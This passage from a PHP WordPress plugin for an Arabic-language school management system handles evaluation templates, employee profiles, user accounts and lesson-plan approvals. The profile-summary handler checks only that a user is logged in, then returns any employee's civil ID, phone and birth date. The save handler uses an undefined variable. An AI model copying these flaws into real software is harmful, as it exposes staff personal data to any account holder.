            wp_send_json_error('غير مصرح لك بإدارة نماذج التقييم.');
        }

        $title = sanitize_text_field($_POST['title'] ?? '');
        $role_key = sanitize_text_field($_POST['role_key'] ?? 'sm_teacher');
        $questions_raw = $_POST['questions'] ?? array();

        if (empty($title) || empty($questions_raw)) {
            wp_send_json_error('يرجى كتابة عنوان النموذج وإضافة سؤال واحد على الأقل.');
        }

        global $wpdb;
        $wpdb->insert(
            "{$wpdb->prefix}sm_eval_templates",
            array(
                'title' => $title,
                'role_key' => $role_key,
                'total_questions' => count($questions_raw),
                'is_active' => 1,
                'created_at' => current_time('mysql'),
                'updated_at' => current_time('mysql')
            )
        );

        $tmpl_id = $wpdb->insert_id;

        foreach ($questions_raw as $idx => $q_text) {
            $q_clean = sanitize_text_field($q_text);
            if (!empty($q_clean)) {
                $wpdb->insert(
                    "{$wpdb->prefix}sm_eval_questions",
                    array(
                        'template_id' => $tmpl_id,
                        'question_text' => $q_clean,
                        'category_name' => 'معايير الأداء المعتمدة',
                        'display_order' => ($idx + 1),
                        'max_score' => 10,
                        'created_at' => current_time('mysql')
                    )
                );
            }
        }

        wp_send_json_success(array('tmpl_id' => $tmpl_id, 'message' => 'تم حفظ نموذج التقييم الجديد بنجاح'));
    }

    public function ajax_get_teacher_profile_summary() {
        if (!is_user_logged_in()) {
            wp_send_json_error('غير مصرح لك بالوصول.');
        }

        $user_id = intval($_POST['user_id'] ?? 0);
        if ($user_id <= 0) {
            wp_send_json_error('معرف الموظف غير صحيح.');
        }

        clean_user_cache($user_id);
        $user = get_userdata($user_id);
        if (!$user) {
            wp_send_json_error('الموظف غير موجود بالنظام.');
        }

        global $wpdb;

        $roles = (array) $user->roles;
        $primary_role = !empty($roles) ? reset($roles) : 'sm_teacher';
        $role_labels = array(
            'administrator' => 'مدير النظام المطور',
            'sm_system_admin' => 'مدير النظام المطور',
            'sm_principal' => 'مدير المدرسة',
            'sm_supervisor' => 'مشرف تربوي',
            'sm_coordinator' => 'منسق مادة',
            'sm_teacher' => 'معلم',
            'sm_student' => 'طالب',
            'sm_parent' => 'ولي أمر',
            'sm_discipline_supervisor' => 'مشرف سلوك / انضباط',
            'sm_activities_supervisor' => 'مشرف أنشطة',
            'sm_transportation_supervisor' => 'مشرف نقل ومواصلات',
            'sm_bus_supervisor' => 'مشرف حافلة',
            'sm_clinic' => 'العيادة المدرسية',
            'sm_hr' => 'الموارد البشرية (HR)'
        );

        $emp_number = get_user_meta($user_id, 'eess_employee_number', true) ?: (get_user_meta($user_id, 'sm_employee_id', true) ?: $user->user_login);
        $school_name = get_user_meta($user_id, 'eess_school_name', true) ?: 'المدرسة الرئيسية';
        $department = get_user_meta($user_id, 'eess_department', true) ?: (get_user_meta($user_id, 'department', true) ?: get_user_meta($user_id, 'sm_department', true) ?: 'قسم التربية البدنية والصحية');
        $subject = get_user_meta($user_id, 'sm_specialization', true) ?: (get_user_meta($user_id, 'specialization', true) ?: 'التربية البدنية والصحية');

        $assigned_grades_raw = get_user_meta($user_id, 'sm_assigned_grades', true) ?: (get_user_meta($user_id, 'eess_assigned_grades', true) ?: (get_user_meta($user_id, 'sm_grade_level', true) ?: 'الصف العاشر'));
        if (is_array($assigned_grades_raw)) $assigned_grades_raw = implode(', ', $assigned_grades_raw);
        $assigned_grades_clean = str_replace(array('[', ']', '"', "'", '\\'), '', (string)$assigned_grades_raw);

        $assigned_sections_raw = get_user_meta($user_id, 'sm_assigned_sections', true) ?: (get_user_meta($user_id, 'eess_assigned_sections', true) ?: 'شعبة 1، شعبة 2');
        if (is_array($assigned_sections_raw)) $assigned_sections_raw = implode(', ', $assigned_sections_raw);

        $phone = get_user_meta($user_id, 'phone_number', true) ?: (get_user_meta($user_id, 'sm_phone', true) ?: '---');
        $civil_id = get_user_meta($user_id, 'eess_civil_id', true) ?: (get_user_meta($user_id, 'civil_id', true) ?: '---');
        $nationality = get_user_meta($user_id, 'nationality', true) ?: (get_user_meta($user_id, 'sm_nationality', true) ?: 'الإمارات العربية المتحدة');
        $gender = get_user_meta($user_id, 'gender', true) ?: (get_user_meta($user_id, 'eess_gender', true) ?: 'ذكر');
        $dob = get_user_meta($user_id, 'dob', true) ?: (get_user_meta($user_id, 'sm_dob', true) ?: '---');
        $emirate = get_user_meta($user_id, 'eess_emirate', true) ?: 'دبي';
        $appoint_year = get_user_meta($user_id, 'eess_appointment_year', true) ?: (get_user_meta($user_id, 'appointment_year', true) ?: '2022');
        $photo_url = get_avatar_url($user_id, array('size' => 120));

        // Fetch Term Plans Activity
        $term_plans = $wpdb->get_results($wpdb->prepare(
            "SELECT id, term_number, subject, grade, status, updated_at, created_at, plan_file_url FROM {$wpdb->prefix}sm_term_plans WHERE teacher_id = %d ORDER BY term_number ASC, updated_at DESC",
            $user_id
        ));
        $term_plans_count = count($term_plans);
        $term_plans_summary = array();
        $latest_term_plan_date = '---';

        foreach ($term_plans as $tp) {
            $dt = $tp->updated_at ?: $tp->created_at;
            if ($latest_term_plan_date === '---' && !empty($dt)) {
                $latest_term_plan_date = date_i18n('Y-m-d H:i', strtotime($dt));
            }
            $term_plans_summary[] = array(
                'id' => $tp->id,
                'term_number' => $tp->term_number,
                'subject' => $tp->subject,
                'grade' => $tp->grade,
                'status' => $tp->status,
                'date' => date_i18n('Y-m-d H:i', strtotime($dt)),
                'file_url' => $tp->plan_file_url ?: ''
            );
        }

        // Fetch Lesson Preparation Activity
        $lesson_preps = $wpdb->get_results($wpdb->prepare(
            "SELECT id, title, subject, grade_level, status, created_at, updated_at, file_url FROM {$wpdb->prefix}sm_lesson_preps WHERE teacher_id = %d ORDER BY created_at DESC LIMIT 10",
            $user_id
        ));
        $total_lesson_preps_count = $wpdb->get_var($wpdb->prepare(
            "SELECT COUNT(*) FROM {$wpdb->prefix}sm_lesson_preps WHERE teacher_id = %d",
            $user_id
        )) ?: 0;

        $lesson_preps_summary = array();
        $latest_lesson_prep_date = '---';
        $acad_anchor_ts = strtotime('2026-08-28 00:00:00');
        $weeks_set = array();

        foreach ($lesson_preps as $lp) {
            $dt = $lp->updated_at ?: $lp->created_at;
            if ($latest_lesson_prep_date === '---' && !empty($dt)) {
                $latest_lesson_prep_date = date_i18n('Y-m-d H:i', strtotime($dt));
            }
            $p_ts = strtotime($dt);
            $cw = ($p_ts >= $acad_anchor_ts) ? (intval(floor(($p_ts - $acad_anchor_ts) / (7 * 86400))) + 1) : 1;
            $weeks_set[$cw] = true;

            // Calculate lateness indicator (Friday 00:00 -> Monday 09:30 submission window)
            $is_late = false;
            if (!empty($lp->delay_seconds) && $lp->delay_seconds > 0) {
                $is_late = true;
            }

            $lesson_preps_summary[] = array(
                'id' => $lp->id,
                'title' => $lp->title ?: 'تحضير درس',
                'subject' => $lp->subject,
                'grade' => $lp->grade_level,
                'status' => $lp->status,
                'is_late' => $is_late,
                'week' => $cw,
                'date' => date_i18n('Y-m-d H:i', strtotime($dt)),
                'file_url' => $lp->file_url ?: ''
            );
        }

        wp_send_json_success(array(
            'user_id' => $user_id,
            'full_name' => $user->display_name,
            'employee_number' => $emp_number,
            'user_email' => $user->user_email,
            'role_label' => $role_labels[$primary_role] ?? 'مستخدم النظام',
            'school_name' => $school_name,
            'department' => $department,
            'subject' => $subject,
            'assigned_grades' => $assigned_grades_clean ?: 'الكل',
            'assigned_sections' => $assigned_sections_raw ?: 'الكل',
            'phone' => $phone,
            'civil_id' => $civil_id,
            'nationality' => $nationality,
            'gender' => $gender,
            'dob' => $dob,
            'emirate' => $emirate,
            'appointment_year' => $appoint_year,
            'photo_url' => $photo_url,
            'term_plans_count' => $term_plans_count,
            'latest_term_plan_date' => $latest_term_plan_date,
            'term_plans_summary' => $term_plans_summary,
            'lesson_preps_count' => $total_lesson_preps_count,
            'weeks_covered_count' => count($weeks_set),
            'latest_lesson_prep_date' => $latest_lesson_prep_date,
            'lesson_preps_summary' => $lesson_preps_summary
        ));
    }

    public function ajax_get_user_unified() {
        check_ajax_referer('sm_user_action', 'sm_nonce');
        if (!current_user_can('manage_options') && !current_user_can('edit_users')) {
            wp_send_json_error('غير مصرح لك بعرض بيانات هذا المستخدم.');
        }

        $user_id = intval($_POST['user_id'] ?? 0);
        $user = get_userdata($user_id);
        if (!$user) {
            wp_send_json_error('المستخدم غير موجود.');
        }

        $roles = $user->roles;
        $role  = !empty($roles) ? reset($roles) : 'teachers';

        $first_name   = get_user_meta($user_id, 'first_name', true) ?: $user->first_name;
        $last_name    = get_user_meta($user_id, 'last_name', true) ?: $user->last_name;
        $country_code = get_user_meta($user_id, 'eess_country_code', true) ?: '+971';
        $full_phone   = get_user_meta($user_id, 'sm_phone', true) ?: get_user_meta($user_id, 'phone_number', true);
        $phone_number = $full_phone;
        if (!empty($full_phone)) {
            foreach (array('+971', '+966', '+965', '+974', '+973', '+968', '+20') as $code) {
                if (strpos($full_phone, $code) === 0) {
                    $country_code = $code;
                    $phone_number = trim(substr($full_phone, strlen($code)));
                    break;
                }
            }
        }

        $employee_id  = get_user_meta($user_id, 'sm_employee_id', true) ?: get_user_meta($user_id, 'employee_id', true);
        if (empty($employee_id)) {
            $employee_id = $user->user_login;
        }
        $employee_id = trim(preg_replace('/^(EMP|EMP-|_)+/i', '', $employee_id));
        $user_status   = get_user_meta($user_id, 'sm_user_status', true) ?: 'active';
        $civil_id      = get_user_meta($user_id, 'eess_civil_id', true);
        $dob           = get_user_meta($user_id, 'dob', true) ?: get_user_meta($user_id, 'sm_dob', true);
        $nationality   = get_user_meta($user_id, 'nationality', true) ?: get_user_meta($user_id, 'sm_nationality', true);
        $gender        = get_user_meta($user_id, 'gender', true) ?: get_user_meta($user_id, 'eess_gender', true);
        $address       = get_user_meta($user_id, 'address', true) ?: get_user_meta($user_id, 'eess_address', true);
        $building_info = get_user_meta($user_id, 'eess_building_info', true);
        $emirate       = get_user_meta($user_id, 'eess_emirate', true) ?: '';
        $access_scope  = get_user_meta($user_id, 'eess_access_scope', true) ?: 'school';

        $institution_id = get_user_meta($user_id, 'eess_institution_id', true) ?: get_user_meta($user_id, 'eess_school_id', true);
        $school_id      = get_user_meta($user_id, 'eess_school_id', true) ?: get_user_meta($user_id, 'sm_school_id', true);
        $school_name    = get_user_meta($user_id, 'eess_school_name', true);
        if (empty($school_name) && $institution_id > 0 && class_exists('EESS_Org_Helper')) {
            $inst_obj = EESS_Org_Helper::get_institution_by_id($institution_id);
            if ($inst_obj && !empty($inst_obj->name)) {
                $school_name = $inst_obj->name;
            }
        }
        if (empty($school_name)) $school_name = 'المدرسة الرئيسية';
        $department     = get_user_meta($user_id, 'department', true) ?: get_user_meta($user_id, 'sm_department', true);
        $admin_section  = get_user_meta($user_id, 'eess_admin_section', true);
        $specialization = get_user_meta($user_id, 'specialization', true) ?: get_user_meta($user_id, 'sm_specialization', true);
        $assigned_sections = get_user_meta($user_id, 'eess_assigned_sections', true) ?: '';

        $assigned_grades = get_user_meta($user_id, 'eess_assigned_grades', true);
        if (!is_array($assigned_grades)) {
            $assigned_grades = json_decode($assigned_grades, true) ?: array();
        }

        $photo_url = get_user_meta($user_id, 'eess_profile_photo', true) ?: get_user_meta($user_id, 'sm_profile_photo_url', true);
        if (!$photo_url) {
            $photo_url = get_avatar_url($user_id);
        }

        wp_send_json_success(array(
            'id'                => $user_id,
            'first_name'        => $first_name,
            'last_name'         => $last_name,
            'user_login'        => $user->user_login,
            'user_email'        => $user->user_email,
            'country_code'      => $country_code,
            'phone_number'      => $phone_number,
            'employee_id'       => $employee_id,
            'user_status'       => $user_status,
            'civil_id'          => $civil_id,
            'dob'               => $dob,
            'nationality'       => $nationality,
            'gender'            => $gender,
            'address'           => $address,
            'building_info'     => $building_info,
            'emirate'           => $emirate,
            'role'              => $role,
            'access_scope'      => $access_scope,
            'institution_id'    => $institution_id,
            'school_id'         => $school_id,
            'school_name'       => $school_name,
            'department'        => $department,
            'admin_section'     => $admin_section,
            'specialization'    => $specialization,
            'assigned_grades'   => $assigned_grades,
            'assigned_sections' => $assigned_sections,
            'appointment_year'  => get_user_meta($user_id, 'eess_appointment_year', true) ?: (get_user_meta($user_id, 'sm_appointment_year', true) ?: date('Y')),
            'job_rank'          => get_user_meta($user_id, 'eess_job_rank', true) ?: 'teacher',
            'photo_url'         => $photo_url,
        ));
    }

    public function ajax_get_departments_by_school() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        $institution_id = intval($_POST['institution_id'] ?? 0);
        if ($institution_id <= 0) {
            $school_id = intval($_POST['school_id'] ?? 0);
            if ($school_id > 0) {
                $institution_id = $school_id;
            }
        }

        $departments = array();
        if ($institution_id > 0 && class_exists('EESS_Org_Helper')) {
            $dept_objs = EESS_Org_Helper::get_departments_by_institution($institution_id);
            if (!empty($dept_objs)) {
                foreach ($dept_objs as $d) {
                    if (!empty($d->name)) {
                        $departments[] = array(
                            'id' => $d->id,
                            'name' => $d->name
                        );
                    }
                }
            }
        }

        if (empty($departments) && class_exists('SM_Settings')) {
            $fallback = SM_Settings::get_departments();
            foreach ($fallback as $fk => $fv) {
                $departments[] = array('id' => $fk, 'name' => $fv);
            }
        }

        wp_send_json_success($departments);
    }

    public function ajax_save_user_unified() {
        check_ajax_referer('sm_user_action', 'sm_nonce');

        $user_id     = intval($_POST['user_id'] ?? 0);
        $curr_user_id = get_current_user_id();
        $is_system_admin = current_user_can('manage_options') || current_user_can('edit_users');

        // Allow users to edit their own basic profile details OR admins to edit any account
        if (!$is_system_admin && ($user_id !== $curr_user_id || $user_id === 0)) {
            wp_send_json_error('عذراً، لا تمتلك صلاحيات تعديل أو إضافة الحسابات.');
        }

        $first_name  = sanitize_text_field($_POST['first_name'] ?? '');
        $last_name   = sanitize_text_field($_POST['last_name'] ?? '');
        $raw_emp_id  = sanitize_text_field($_POST['employee_id'] ?? '');
        $country_code = sanitize_text_field($_POST['country_code'] ?? '+971');
        $raw_phone   = sanitize_text_field($_POST['phone_number'] ?? '');
        $email       = sanitize_email($_POST['user_email'] ?? '');
        $user_pass   = $_POST['user_pass'] ?? '';
        $user_status = sanitize_text_field($_POST['user_status'] ?? 'active');
        $civil_id    = sanitize_text_field($_POST['civil_id'] ?? '');

        // Strip prefixes from employee number (e.g., 'EMP-00025' -> '00025')
        $clean_emp_id = trim(preg_replace('/^(EMP|EMP-|_)+/i', '', trim($raw_emp_id)));
        if (empty($clean_emp_id)) {
            $clean_emp_id = trim($raw_emp_id);
        }

        // Rule: Username MUST EQUAL Employee Number
        $username    = $clean_emp_id;
        $employee_id = $clean_emp_id;

        // Combine country code and phone number
        $clean_phone_body = ltrim($raw_phone, '0');
        $full_phone = $country_code . ' ' . $clean_phone_body;

        $user_role      = sanitize_text_field($_POST['user_role'] ?? 'sm_teacher');
        if ($user_role === 'teachers') $user_role = 'sm_teacher';
        if ($user_role === 'school_manager') $user_role = 'sm_principal';
        if ($user_role === 'educational_supervisor') $user_role = 'sm_supervisor';
        if ($user_role === 'clinic') $user_role = 'sm_clinic';
        if ($user_role === 'accountant') $user_role = 'sm_accountant';

        // Security: Non-admin users editing their own profile MUST retain their existing role
        if (!$is_system_admin && $user_id > 0) {
            $existing_user = get_userdata($user_id);
            if ($existing_user && !empty($existing_user->roles)) {
                $user_role = $existing_user->roles[0];
            }
        }
        $access_scope   = sanitize_text_field($_POST['access_scope'] ?? 'school');
        $institution_id = intval($_POST['institution_id'] ?? 0);
        $school_id      = intval($_POST['school_id'] ?? 0);
        $department     = sanitize_text_field($_POST['department'] ?? '');
        $specialization = sanitize_text_field($_POST['specialization'] ?? '');
        $nationality    = sanitize_text_field($_POST['nationality'] ?? '');
        $dob            = sanitize_text_field($_POST['dob'] ?? '');
        $gender         = sanitize_text_field($_POST['gender'] ?? '');
        $address        = sanitize_text_field($_POST['address'] ?? '');
        $building_info  = sanitize_text_field($_POST['building_info'] ?? '');
        $emirate        = sanitize_text_field($_POST['emirate'] ?? '');
        $country_res    = sanitize_text_field($_POST['country_residence'] ?? 'الإمارات العربية المتحدة');
        $admin_section  = sanitize_text_field($_POST['admin_section'] ?? '');
        $sections       = sanitize_text_field($_POST['assigned_sections'] ?? '');
        $grades         = isset($_POST['assigned_grades']) ? array_map('sanitize_text_field', (array)$_POST['assigned_grades']) : array();
        $appointment_year = intval($_POST['appointment_year'] ?? date('Y'));
        if ($appointment_year < 1970 || $appointment_year > intval(date('Y'))) {
            $appointment_year = intval(date('Y'));
        }
        $job_rank = sanitize_text_field($_POST['job_rank'] ?? 'teacher');

        if (empty($first_name) || empty($last_name) || empty($email) || empty($raw_phone)) {
            wp_send_json_error('يرجى استكمال جميع الحقول الأساسية المطلوبة.');
        }

        if ($user_role !== 'administrator' && empty($employee_id)) {
            wp_send_json_error('الرقم الوظيفي إلزامي.');
        }

        $display_name = trim($first_name . ' ' . $last_name);

        if ($user_id > 0) {
            // Edit User
            $user_data = array(
                'ID'           => $user_id,
                'first_name'   => $first_name,
                'last_name'    => $last_name,
                'display_name' => $display_name,
                'user_email'   => $email,
            );

            if (!empty($user_pass)) {
                if (strlen($user_pass) < 8 || !preg_match('/[A-Z]/', $user_pass) || !preg_match('/[a-z]/', $user_pass) || !preg_match('/[0-9]/', $user_pass)) {
                    wp_send_json_error('كلمة المرور يجب أن تتضمن 8 خانات على الأقل مع حرف كبير وحرف صغير ورقم.');
                }
                $user_data['user_pass'] = $user_pass;
            }

            // Protect root admin account and sync username with employee number
            $target_user = get_userdata($user_id);
            if ($target_user && ($target_user->user_email === 'info@eess.online' || $target_user->user_login === '00000')) {
                $user_role = 'administrator';
            } else if ($target_user && $target_user->user_login !== $clean_emp_id) {
                global $wpdb;
                $wpdb->update($wpdb->users, array('user_login' => $clean_emp_id), array('ID' => $user_id));
            }

            $updated = wp_update_user($user_data);
            if (is_wp_error($updated)) {
                wp_send_json_error($updated->get_error_message());
            }
        } else {
            // New User
            if (empty($username) || empty($user_pass)) {
                wp_send_json_error('يرجى تحديد اسم المستخدم وكلمة المرور للحساب الجديد.');
            }
            if (strlen($user_pass) < 8 || !preg_match('/[A-Z]/', $user_pass) || !preg_match('/[a-z]/', $user_pass) || !preg_match('/[0-9]/', $user_pass)) {
                wp_send_json_error('كلمة المرور يجب أن تتضمن 8 خانات على الأقل مع حرف كبير وحرف صغير ورقم.');
            }
            if (username_exists($username)) {
                wp_send_json_error('اسم المستخدم مُسجل سابقاً في المنصة.');
            }
            if (email_exists($email)) {
                wp_send_json_error('البريد الإلكتروني مسجل حساب آخر بالمنصة.');
            }

            $user_id = wp_create_user($username, $user_pass, $email);
            if (is_wp_error($user_id)) {
                wp_send_json_error($user_id->get_error_message());
            }

            wp_update_user(array(
                'ID'           => $user_id,
                'first_name'   => $first_name,
                'last_name'    => $last_name,
                'display_name' => $display_name,
            ));
        }

        // Set Role (Role field modification strictly restricted to System Administrators)
        $current_user_roles = (array) wp_get_current_user()->roles;
        $is_sys_admin_editor = in_array('administrator', $current_user_roles) || in_array('sm_system_admin', $current_user_roles) || current_user_can('manage_options');
        $u = new WP_User($user_id);
        if ($is_new_user || $is_sys_admin_editor) {
            $u->set_role($user_role);
        }

        // Derive school name from institution lookup for system-wide synchronization
        $school_name = 'المدرسة الرئيسية';
        if ($institution_id > 0 && class_exists('EESS_Org_Helper')) {
            $inst_obj = EESS_Org_Helper::get_institution_by_id($institution_id);
            if ($inst_obj && !empty($inst_obj->name)) {
                $school_name = $inst_obj->name;
            }
        }

        // Synchronize Metadata Across WP Metas and EESS Tables
        update_user_meta($user_id, 'first_name', $first_name);
        update_user_meta($user_id, 'last_name', $last_name);
        update_user_meta($user_id, 'eess_country_code', $country_code);
        update_user_meta($user_id, 'sm_phone', $full_phone);
        update_user_meta($user_id, 'phone_number', $full_phone);
        update_user_meta($user_id, 'sm_employee_id', $clean_emp_id);
        update_user_meta($user_id, 'employee_id', $clean_emp_id);
        update_user_meta($user_id, 'eess_employee_number', $clean_emp_id);
        update_user_meta($user_id, 'sm_user_status', $user_status);
        update_user_meta($user_id, 'eess_civil_id', $civil_id);
        update_user_meta($user_id, 'eess_emirate', $emirate);
        update_user_meta($user_id, 'gender', $gender);
        update_user_meta($user_id, 'eess_gender', $gender);
        update_user_meta($user_id, 'address', $address);
        update_user_meta($user_id, 'eess_address', $address);
        update_user_meta($user_id, 'eess_building_info', $building_info);
        if (!empty($dob)) {
            update_user_meta($user_id, 'dob', $dob);
            update_user_meta($user_id, 'sm_dob', $dob);
        }
        if (!empty($nationality)) {
            update_user_meta($user_id, 'nationality', $nationality);
            update_user_meta($user_id, 'sm_nationality', $nationality);
        }
        update_user_meta($user_id, 'eess_access_scope', $access_scope);
        update_user_meta($user_id, 'eess_institution_id', $institution_id);
        update_user_meta($user_id, 'eess_school_id', $school_id);
        update_user_meta($user_id, 'sm_school_id', $school_id);
        update_user_meta($user_id, 'eess_school_name', $school_name);
        update_user_meta($user_id, 'sm_school_name', $school_name);
        update_user_meta($user_id, 'eess_department', $department);
        update_user_meta($user_id, 'department', $department);
        update_user_meta($user_id, 'sm_department', $department);
        update_user_meta($user_id, 'eess_admin_section', $admin_section);
        update_user_meta($user_id, 'specialization', $specialization);
        update_user_meta($user_id, 'sm_specialization', $specialization);
        update_user_meta($user_id, 'eess_assigned_grades', json_encode($grades, JSON_UNESCAPED_UNICODE));
        update_user_meta($user_id, 'eess_assigned_sections', $sections);
        update_user_meta($user_id, 'eess_appointment_year', $appointment_year);
        update_user_meta($user_id, 'sm_appointment_year', $appointment_year);
        update_user_meta($user_id, 'eess_job_rank', $job_rank);

        // Handle Profile Photo Upload if present
        if (!empty($_FILES['profile_photo']['name'])) {
            require_once(ABSPATH . 'wp-admin/includes/image.php');
            require_once(ABSPATH . 'wp-admin/includes/file.php');
            require_once(ABSPATH . 'wp-admin/includes/media.php');

            $attachment_id = media_handle_upload('profile_photo', 0);
            if (!is_wp_error($attachment_id)) {
                $photo_url = wp_get_attachment_url($attachment_id);
                update_user_meta($user_id, 'sm_profile_photo_id', $attachment_id);
                update_user_meta($user_id, 'sm_profile_photo_url', $photo_url);
            }
        }

        SM_Logger::log('حفظ وتزامن حساب موظف', "تم حفظ بيانات وتزامن الحساب للموظف $display_name (ID: $user_id)");

        wp_send_json_success(array(
            'message' => 'تم حفظ وتزامن بيانات الموظف بنجاح في قاعدة البيانات والأنظمة المرتبطة.',
            'user_id' => $user_id
        ));
    }

    public function ajax_quick_approve_prep() {
        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_lesson_prep_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action')) {
            wp_send_json_error('Security check failed');
        }
        $user_id = get_current_user_id();
        $roles = (array) wp_get_current_user()->roles;
        $can_review = in_array('administrator', $roles) || in_array('sm_system_admin', $roles) || in_array('sm_principal', $roles) || in_array('sm_supervisor', $roles) || in_array('sm_coordinator', $roles) || in_array('sm_hod', $roles) || in_array('sm_activities_supervisor', $roles) || current_user_can('manage_options');

        if (!$can_review) {
            wp_send_json_error('عذراً، لا تمتلك صلاحيات اعتماد خطط التحضير.');
        }

        $prep_id = intval($_POST['prep_id'] ?? 0);
        if ($prep_id <= 0) {
            wp_send_json_error('معرف التحضير غير صحيح.');
        }

        global $wpdb;
        $updated = $wpdb->update(
            "{$wpdb->prefix}sm_lesson_preps",
            array(
                'status' => 'approved',
                'reviewed_by' => $user_id,
                'reviewed_at' => current_time('mysql'),
                'review_notes' => 'تم الاعتماد المباشر بواسطة الموجه/رئيس القسم'
            ),
            array('id' => $prep_id)
        );

        if ($updated !== false) {
            $prep = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_lesson_preps WHERE id = %d", $prep_id));
            SM_Logger::log('اعتماد تحضير درس', "تم اعتماد التحضير: " . ($prep->title ?? '') . " (ID: $prep_id) بواسطة المستخدم ID: $user_id");
            wp_send_json_success(array('message' => 'تم اعتماد خطة التحضير بنجاح.', 'prep_id' => $prep_id));
        } else {
            wp_send_json_error('فشل في تغيير حالة الاعتماد بالمرئيات.');
        }
    }

    public function ajax_update_prep_status_and_time() {
        $nonce = $_POST['nonce'] ?? ($_POST['sm_nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'eess_lesson_prep_action') && !wp_verify_nonce($nonce, 'sm_admin_action')) {
            wp_send_json_error('Security check failed');
        }

        $user_id = get_current_user_id();
        $roles = (array) wp_get_current_user()->roles;
        $can_review = in_array('administrator', $roles) || in_array('sm_system_admin', $roles) || in_array('sm_principal', $roles) || in_array('sm_supervisor', $roles) || in_array('sm_coordinator', $roles) || in_array('sm_hod', $roles) || in_array('sm_activities_supervisor', $roles) || current_user_can('manage_options');

        if (!$can_review) {
            wp_send_json_error('عذراً، لا تمتلك الصلاحية الكافية لتعديل حالة وتاريخ التسليم.');
        }

        $prep_id = intval($_POST['prep_id'] ?? 0);
        $status = sanitize_text_field($_POST['status'] ?? 'submitted');
        $raw_dt = sanitize_text_field($_POST['submission_time'] ?? '');

        if ($prep_id <= 0) {
            wp_send_json_error('معرف تحضير الدرس غير صالح.');
        }

        global $wpdb;
        $update_data = array(
            'status' => $status,
            'updated_at' => current_time('mysql')
        );

        if (!empty($raw_dt)) {
            $formatted_dt = date('Y-m-d H:i:s', strtotime($raw_dt));
            $update_data['submission_time'] = $formatted_dt;
            $update_data['created_at'] = $formatted_dt;
        }

        $updated = $wpdb->update("{$wpdb->prefix}sm_lesson_preps", $update_data, array('id' => $prep_id));

        if ($updated !== false) {
            SM_Logger::log('تحديث حالة التحضير وموعده', "تم تعديل التحضير ID: $prep_id إلى الحالة ($status) وتعديل موعد التسليم بواسطة ID: $user_id");
            wp_send_json_success(array('message' => 'تم تحديث حالة وتاريخ تسليم التحضير بنجاح.'));
        } else {
            wp_send_json_error('فشل تحديث بيانات تحضير الدرس بالخادم.');
        }
    }

    public function ajax_reject_lesson_prep() {
        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_lesson_prep_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action')) {
            wp_send_json_error('Security check failed');
        }
        $user_id = get_current_user_id();
        $roles = (array) wp_get_current_user()->roles;
        $can_review = in_array('administrator', $roles) || in_array('sm_system_admin', $roles) || in_array('sm_principal', $roles) || in_array('sm_supervisor', $roles) || in_array('sm_coordinator', $roles) || in_array('sm_hod', $roles) || in_array('sm_activities_supervisor', $roles) || current_user_can('manage_options');

        if (!$can_review) {
            wp_send_json_error('عذراً، لا تمتلك صلاحيات رفض وتوجيه ملاحظات تحضير الدروس.');
        }

        $prep_id = intval($_POST['prep_id'] ?? 0);
        $notes = sanitize_textarea_field($_POST['notes'] ?? '');

        if ($prep_id <= 0 || empty($notes)) {
            wp_send_json_error('يرجى تحديد التحضير وإدخال ملاحظات التوجيه المطلوبة.');
        }

        global $wpdb;
        $updated = $wpdb->update(
            "{$wpdb->prefix}sm_lesson_preps",
            array(
                'status' => 'revision_required',
                'reviewed_by' => $user_id,
                'reviewed_at' => current_time('mysql'),
                'review_notes' => $notes
            ),
            array('id' => $prep_id)
        );

        if ($updated !== false) {
            // Save comment to sm_lesson_comments
            $wpdb->insert(
                "{$wpdb->prefix}sm_lesson_comments",
                array(
                    'prep_id' => $prep_id,
                    'user_id' => $user_id,
                    'comment_text' => $notes,
                    'created_at' => current_time('mysql')
                )
            );

            $prep = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_lesson_preps WHERE id = %d", $prep_id));
            SM_Logger::log('رفض وتحويل تحضير درس للتعديل', "تم إحالة التحضير (ID: $prep_id) للتعديل بواسطة المستخدم ID: $user_id بملاحظات: $notes");
            wp_send_json_success(array('message' => 'تم تسجيل الملاحظات وتحديث حالة الدرس للتعديل بنجاح.', 'prep_id' => $prep_id));
        } else {
            wp_send_json_error('تعذر حفظ حالة الرفض في قاعدة البيانات.');
        }
    }

    public function ajax_bulk_lesson_action() {
        $nonce = $_POST['sm_nonce'] ?? ($_POST['nonce'] ?? '');
        if (!wp_verify_nonce($nonce, 'eess_lesson_prep_action') && !wp_verify_nonce($nonce, 'eess_admin_action') && !wp_verify_nonce($nonce, 'sm_admin_action')) {
            wp_send_json_error('Security check failed');
        }
        $user_id = get_current_user_id();
        $roles = (array) wp_get_current_user()->roles;
        $can_review = in_array('administrator', $roles) || in_array('sm_system_admin', $roles) || in_array('sm_principal', $roles) || in_array('sm_supervisor', $roles) || in_array('sm_coordinator', $roles) || in_array('sm_hod', $roles) || in_array('sm_activities_supervisor', $roles) || current_user_can('manage_options');

        $bulk_action = sanitize_text_field($_POST['bulk_action'] ?? '');
        $prep_ids = !empty($_POST['prep_ids']) ? array_map('intval', (array)$_POST['prep_ids']) : array();

        if (empty($prep_ids) || empty($bulk_action)) {
            wp_send_json_error('يرجى تحديد العناصر والإجراء الجماعي المطلوب.');
        }

        global $wpdb;
        $placeholders = implode(',', array_fill(0, count($prep_ids), '%d'));

        if ($bulk_action === 'approve') {
            if (!$can_review) {
                wp_send_json_error('عذراً، لا تمتلك صلاحيات الاعتماد الجماعي.');
            }
            $wpdb->query($wpdb->prepare("UPDATE {$wpdb->prefix}sm_lesson_preps SET status = 'approved', reviewed_by = %d, reviewed_at = %s WHERE id IN ($placeholders)", array_merge(array($user_id, current_time('mysql')), $prep_ids)));
            wp_send_json_success(array('message' => 'تم اعتماد التحضيرات المحددة بنجاح.'));
        } elseif ($bulk_action === 'delete') {
            if (!$can_review) {
                // If not reviewer/admin, ensure all requested prep IDs belong to current teacher
